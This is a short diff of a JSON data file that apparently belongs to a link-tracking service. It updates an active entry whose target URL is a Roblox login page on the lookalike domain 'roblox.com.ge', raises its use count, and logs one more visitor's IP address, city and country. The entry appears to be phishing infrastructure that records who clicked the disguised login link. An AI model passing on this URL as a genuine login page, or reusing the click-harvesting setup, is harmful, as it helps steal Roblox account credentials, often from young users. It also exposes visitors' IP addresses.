@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1032,
+    "useCount": 1033,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8376,6 +8376,14 @@
         "city": "Louisville",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777231404845,
+        "ip": "187.199.214.7",
+        "country": "Mexico",
+        "city": "Los Cabos",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
       }
     ]
   },
